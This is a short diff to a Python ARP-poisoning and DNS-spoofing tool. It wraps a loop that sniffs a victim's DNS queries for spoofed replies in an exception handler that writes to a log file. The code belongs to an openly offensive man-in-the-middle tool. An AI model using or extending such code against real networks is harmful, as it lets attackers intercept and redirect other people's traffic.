@@ -10,6 +10,8 @@ import threading
 import platform # to support windows and linux
 if platform.system() == "Windows":
     import win32serviceutil # to turn on/off IP forwarding on Windows
+    
+import datetime
 
 """
 ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)
@@ -482,10 +484,16 @@ class ARPP(object):
         # the threading.Event() is used to stop the thread when the user wants (by using e.set())
         e=threading.Event()
         def rec(event):
-            while True:
-                sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback, count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
-                if event.is_set():
-                    break
+            try:
+                while True:
+                    sniff(timeout=3, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback, count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
+                    if event.is_set():
+                        break
+            except:
+                print("Something went wrong in the DNS spoofer, check the log file")
+                with open("log.log", "a") as f:
+                    f.write("{}\n".format(datetime.datetime.now()))
+                    f.write(traceback.format_exc())
         
         T = threading.Thread(target=rec, name="DNS spoofing user with IP {}".format(ipVictim), args=(e,))
         
